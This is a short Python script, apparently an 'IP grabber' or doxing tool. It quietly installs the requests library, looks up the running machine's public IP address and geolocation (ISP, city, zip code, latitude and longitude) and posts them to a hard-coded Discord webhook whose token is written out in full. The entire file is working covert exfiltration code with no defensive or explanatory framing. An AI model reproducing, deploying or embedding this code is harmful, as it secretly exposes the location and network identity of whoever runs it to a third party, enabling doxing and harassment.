try:
    import requests
except ImportError:
    import os
    os.system("pip3 install requests")
    import time
    time.sleep(1)
    import requests

def dox():
    #get ip
    ip = requests.get("https://api.ipify.org").text
    #get location
    location = requests.get(f"http://ip-api.com/json/{ip}").json()
    #get isp
    isp = location["isp"]
    #get org
    org = location["org"]
    #get timezone
    timezone = location["timezone"]
    #get country
    country = location["country"]
    #get region
    region = location["region"]
    #get city
    city = location["city"]
    #get zip
    zipcode = location["zip"]
    #get lat
    lat = location["lat"]
    #get lon
    lon = location["lon"]
    #get country code
    country_code = location["countryCode"]
    #get status
    status = location["status"]
    
    #return

    return location, ip, isp, org, timezone, country, region, city, zipcode, lat, lon

requests.post("https://discord.com/api/webhooks/1185943019514511390/dCaHZd_C9dbrgLE9JtokJh2QJPUfxLw76SeDPVqT6JlUdXT3karAJp78O8-_JL22a_kx", json={"content": f"```IP: {dox()[1]}\nISP: {dox()[2]}\nORG: {dox()[3]}\nTimezone: {dox()[4]}\nCountry: {dox()[5]}\nRegion: {dox()[6]}\nCity: {dox()[7]}\nZipcode: {dox()[8]}\nLatitude: {dox()[9]}\nLongitude: {dox()[10]}```"})
